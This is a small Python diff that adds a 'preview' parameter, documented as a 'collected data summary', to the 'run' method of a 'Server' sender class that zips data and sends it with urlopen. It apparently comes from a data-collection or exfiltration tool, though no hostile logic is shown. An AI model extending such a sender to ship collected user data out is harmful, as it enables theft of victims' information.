@@ -49,13 +49,14 @@ class Server(AbstractSender):
 
         urlopen(query)
 
-    def run(self, zip_name: str, data: BytesIO) -> None:
+    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
         """
         Launches the sender module.
 
         Parameters:
         - zip_name [str]: Archive name.
         - data [BytesIO]: BytesIO object.
+        - preview [str]: Collected data summary.
 
         Returns:
         - None.
